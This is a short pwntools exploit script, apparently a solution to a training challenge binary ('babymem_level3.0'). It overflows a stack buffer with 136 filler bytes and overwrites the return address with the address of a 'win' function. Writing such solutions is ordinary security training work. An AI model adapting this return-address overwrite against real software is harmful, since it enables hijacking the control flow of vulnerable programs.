#!/usr/bin/env python3
from pwn import *

# Set architecture
context.arch = 'amd64'

# Create a process object running the binary
p = process('/challenge/babymem_level3.0')
p.sendline('200')
# Buffer layout
buffer_size = 8*16
additional_padding = 8
win_function_address = p64(0x401833)  

# Constructing the payload
payload = b'A' * buffer_size
payload += b'B' * additional_padding
payload += win_function_address

# Send the payload
p.send(payload)

# Receive and print all data
print(p.recvall().decode())



